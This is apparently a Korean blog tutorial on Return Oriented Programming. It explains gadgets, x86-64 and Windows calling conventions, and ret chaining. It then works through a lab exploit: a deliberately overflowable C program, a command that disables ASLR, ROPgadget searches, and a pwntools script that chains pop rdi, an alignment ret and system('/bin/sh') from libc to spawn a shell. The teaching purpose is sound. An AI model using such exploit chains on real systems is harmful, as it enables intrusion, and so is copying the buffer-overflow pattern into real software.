## ROP란 무엇인가

`ROP(Return Oriented Programming, 반환 지향형 프로그래밍)`는 **메모리 보호기법(NX/DEP 등)**을 우회하기 위해 공격자가 메모리 내에 이미 존재하는 코드 조각들을 조합하여 악의적인 명령을 실행하는 바이너리 익스플로잇 기술이다.

기존의 코드 인젝션 공격은 스택에 쉘코드를 쌓고 실행하지만, NX/DEP 같은 보호 기법은 스택의 실행 권한을 없애버린다. ROP는 이를 우회하기 위해 이미 실행 권한이 있는 코드 영역의 가젯을 재사용한다. 즉 ROP는 스택에 기계어를 쓰지 않고 `메모리 주소`만을 쓴다. NX나 DEP는 스택과 힙 영역의 **실행** 권한을 없애는 것이지 **쓰기/읽기** 권한을 없애는 게 아니기 때문에, 스택에 값을 쓰거나 읽는 것은 여전히 가능하다.

---

## ROP의 핵심 개념

- **가젯(Gadget)**: 메모리에 이미 존재하는 `pop ...; ret;`같은 어셈블리 명령어 조각. 공격자는 새로운 코드를 주입하는 대신 이 가젯을 찾아 활용한다.
- **ROP 체인(ROP Chain)**: 여러 가젯의 주소와 함수의 인자들을 스택에 연속적으로 배치하여, 하나의 프로그램처럼 차례대로 실행되도록 연결한 페이로드.
- **호출 흐름 가로채기**: 버퍼 오버플로우 등의 취약점으로 함수의 반환 주소를 가젯의 주소로 덮어씌워 공격을 시작한다.

---

## 함수 실행과 레지스터의 역할

ROP 공격을 정교하게 설계하려면 CPU가 함수를 호출할 때 사용하는 레지스터 시스템을 이해해야 한다. 레지스터의 역할은 크게 **실행 흐름을 제어하는 레지스터**와 **함수 인자를 전달하는 레지스터**로 나눌 수 있다.

### 1. 실행 흐름 제어 레지스터 (공통)

아키텍처나 운영체제와 관계없이 항상 동일하게 동작하는 레지스터

| 레지스터 | 역할 |
| --- | --- |
| **RIP** (Instruction Pointer) | CPU가 다음번에 실행할 기계어 명령어의 메모리 주소를 가리킨다. **ROP 공격의 목표는 이 RIP에 원하는 가젯이나 함수의 주소를 강제로 밀어 넣는 것**이다. |
| **RSP** (Stack Pointer) | 현재 스택의 가장 최상단(꼭대기) 주소를 가리키며, `ret` 명령어 동작의 기준점이 된다. |

### 2. 함수 인자(Parameter) 전달 레지스터

> 함수 호출 시 인자를 전달하는 방식은 **CPU 아키텍처(32비트 vs 64비트)**와 **운영체제(Linux vs Windows)**에 따라 다르다.현대 시스템에서 가장 많이 쓰이는 **x86-64(64비트)** 환경을 기준으로 정리하겠다.

#### 2-1. Linux / macOS (System V AMD64 ABI)

리눅스·macOS 계열은 `System V AMD64 ABI` 규칙을 따른다. 함수를 호출할 때 **총 6개**의 레지스터를 순서대로 사용해 인자를 전달하며, ROP 체인을 만들 때 가장 많이 조작하게 되는 레지스터들이다.

| 인자 순서 | 레지스터 | 특징 및 암기 팁 |
| --- | --- | --- |
| 제1 인자 | **RDI** | Destination Index. 예: `system("/bin/sh")` 호출 시 `"/bin/sh"` 문자열의 주소가 들어가는 곳 |
| 제2 인자 | **RSI** | Source Index. 예: `read(0, buf, size)`에서 버퍼 주소 `buf`가 들어가는 곳 |
| 제3 인자 | **RDX** | Data register. 예: `read` 함수의 읽을 크기 `size`가 들어가는 곳 |
| 제4 인자 | **RCX** | Counter register |
| 제5 인자 | **R8** | 확장 레지스터 8번 |
| 제6 인자 | **R9** | 확장 레지스터 9번 |

> 인자가 **7개 이상**이면 6개까지만 레지스터에 담고, 7번째 인자부터는 **스택에 역순으로** 쌓아서 전달한다.
> 함수의 **리턴값**은 항상 **RAX** 레지스터에 저장된다.

#### 2-2. Windows (Microsoft x64 Calling Convention)

윈도우는 `Microsoft x64 Calling Convention` 규칙을 따르며, 레지스터를 **4개만** 사용한다는 점이 Linux와의 가장 큰 차이다.

| 인자 순서 | 레지스터 |
| --- | --- |
| 제1 인자 | **RCX** |
| 제2 인자 | **RDX** |
| 제3 인자 | **R8** |
| 제4 인자 | **R9** |

> 윈도우 역시 **5번째 인자**부터는 스택을 이용하며, 리턴값은 동일하게 **RAX**에 저장된다.

#### 2-3. 참고: 32비트(x86) 환경

과거 32비트 아키텍처(x86) 환경에서는 레지스터를 전혀 쓰지 않고 **오직 스택**만을 이용해 모든 인자를 전달했다는 차이점이 있다. (Linux/Windows 공통)

## ret 명령어

스택에는 가젯의 주소만 적혀있음에도 가젯들이 연속적으로 실행되는 이유는, 모든 가젯의 끝에 있는 `ret` 명령어의 동작에 있다.

1. 현재 스택 포인터(RSP)가 가리키고 있는 곳의 주소 값을 읽어서 프로그램 카운터(RIP) 레지스터에 넣어 다음 실행 위치를 변경한다.
2. 스택 포인터를 한 칸 위로 올린다 (pop).

공격자가 스택에 가젯의 주소들을 줄세우면, 첫 번째 가젯이 호출한 `ret`가 스택 다음 칸에 있는 두 번째 가젯 주소를 읽어와 실행하게 되고, 이 과정이 반복되는 것이다.

---

## 레지스터 세팅: pop

가젯 안에 있는 `pop`은 시스템 명령을 내리기 위한 `인자(Parameter) 세팅`을 수행한다. 앞서 살펴본 레지스터 규칙에 따라, 시스템에 `system("/bin/sh")`라는 함수를 실행하는 명령을 내리려면(Linux 기준) 제1 인자 레지스터인 `RDI`에 `"/bin/sh"` 문자열이 저장된 메모리 주소를 넣어줘야 한다. 공격자는 스택에 `"/bin/sh" 주소`를 적고 그 위에 `pop rdi; ret;` 가젯을 시행한다.

- `pop rdi` 실행 → 스택에 있던 `"/bin/sh" 주소`가 꺼내져 `RDI` 레지스터로 들어감
- `ret` 실행 → 다음 가젯(`system` 함수의 주소)으로 넘어감

## Exploit Workflow

```
[취약점 탐색] --> 버퍼 오버플로우 등을 통해 스택의 반환 주소(RET)를 제어할 수 있는지 확인
        |
[가젯 수집] --> ROPgadget 또는 Mona.py 같은 도구를 사용해 바이너리나 공유 라이브러리(libc) 내부에서
                필요한 가젯(pop rdi; ret 등)의 위치를 탐색
        |
[페이로드 구성(ROP Chain) 및 쉘 획득] --> 가젯 주소, 인자 값, 호출할 함수 주소를 정교하게 계산하여
                스택에 배치하고 권한 상승을 유도하거나 시스템 명령 실행(execve)
```

```c
#include <stdio.h>
#include <unistd.h>

void vulnerable(void) {
    char buf[64];

    write(1, "Input: ", 7);

    read(0, buf, 256);

    printf("You entered: %s\n", buf);
}

int main(void) {
    setvbuf(stdout, NULL, _IONBF, 0);

    vulnerable();

    write(1, "Program finished normally.\n", 28);
    return 0;
}
```

### ASLR 비활성화 및 익스플로잇 준비

앞서 바이너리에서 `pop rdi; ret` 가젯을 찾지 못했으므로 libc에서 가져와야 한다.
그런데 ASLR이 켜진 환경(`/proc/sys/kernel/randomize_va_space = 2`)에서는
libc가 매번 다른 주소에 로드되어 고정 주소를 사용할 수 없다.
libc leak을 통한 우회는 별도 포스트에서 다루기로 하고, 여기서는 ASLR을 비활성화하여 진행한다.

```bash
echo 0 | sudo tee /proc/sys/kernel/randomize_va_space
# ASLR 비활성화 후 ldd로 libc 베이스 주소 고정 확인
ldd ./vuln
```

ASLR을 끄면 libc가 항상 동일한 주소(`0x00007ffff7db3000`)에 로드된다.
이제 libc 내부에서 필요한 주소들을 수집한다.

```bash
# libc에서 pop rdi; ret 가젯 탐색
ROPgadget --binary /lib/x86_64-linux-gnu/libc.so.6 --only "pop|ret" | grep "pop rdi"
```

![libcPopRdi](/assets/img/posts/ROP/libcPopRdi.png)

`0x2a9b7` 오프셋의 `pop rdi; ret`을 사용한다.

### ROP Chain 구성

확보한 주소들을 정리하면 다음과 같다.

| 항목 | 주소 | 비고 |
| --- | --- | --- |
| libc base | `0x00007ffff7db3000` | ldd로 확인 |
| pop rdi; ret | `0x00007ffff7ddd9b7` | libc base + 0x2a9b7 |
| /bin/sh | `0x00007ffff7f5dea4` | libc 내 문자열 |
| system() | `0x00007ffff7e07790` | libc 심볼 |
| ret (정렬용) | `0x0000000000401016` | 바이너리 내 ret 가젯 |

스택에 쌓이는 페이로드 구조는 아래와 같다.
```
[ 'A' * 72          ]  <- buf(64) + SFP(8) 채우기
[ pop rdi; ret 주소 ]  <- RET 주소 덮어쓰기, 여기서부터 ROP Chain 시작
[ "/bin/sh" 주소    ]  <- pop rdi가 꺼내 RDI에 저장
[ ret 주소          ]  <- 스택 16바이트 정렬 (system() 호출 전 필수)
[ system() 주소     ]  <- system("/bin/sh") 실행
```
> **스택 정렬(Stack Alignment)**: x86-64 ABI 규칙상 `call` 명령어 실행 시 RSP는 반드시 16바이트 경계에 정렬되어 있어야 한다. ROP Chain에서는 이 정렬이 깨질 수 있어, `system()` 호출 직전에 아무 동작도 하지 않는 `ret` 가젯을 하나 삽입해 RSP를 한 칸 이동시켜 정렬을 맞춰준다.

### 익스플로잇 코드

```python
from pwn import *

elf  = ELF("./vuln")
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
p    = process("./vuln")

libc_base = 0x00007ffff7db3000

pop_rdi = libc_base + 0x2a9b7
binsh   = libc_base + next(libc.search(b"/bin/sh"))
system  = libc_base + libc.symbols["system"]
ret     = 0x0000000000401016  # stack alignment용

log.info(f"libc base : {hex(libc_base)}")
log.info(f"pop rdi   : {hex(pop_rdi)}")
log.info(f"/bin/sh   : {hex(binsh)}")
log.info(f"system()  : {hex(system)}")

payload  = b"A" * 72       # offset: buf(64) + SFP(8)
payload += p64(pop_rdi)    # pop rdi; ret -> RDI = "/bin/sh"
payload += p64(binsh)
payload += p64(ret)        # stack alignment
payload += p64(system)     # system("/bin/sh")

p.recvuntil(b"Input: ")
p.sendline(payload)

p.interactive()
```

## 마치며

이번 포스트에서는 NX가 활성화된 환경에서 ROP를 이용해 `system("/bin/sh")`을 실행하는 기초적인 익스플로잇을 실습했다. 핵심을 정리하면 다음과 같다.

- NX는 스택 실행을 막지만, **스택에 주소를 쓰는 것은 막지 않는다**
- `ret` 명령어의 동작을 이용해 가젯들을 체인처럼 연결할 수 있다
- 함수 인자는 레지스터(`RDI`, `RSI`, `RDX` 등)로 전달되므로, `pop` 가젯으로 레지스터를 세팅해야 한다
- 내 바이너리에 가젯이 없으면 **libc에서 찾으면 된다**

실제 환경에서는 ASLR이 켜져 있어 libc 주소가 매번 바뀐다. 이를 우회하는 **libc leak** 기법(`ret2plt`, `ret2got`)과 `__libc_csu_init`을 활용하는 **ret2csu** 방법이 있다.
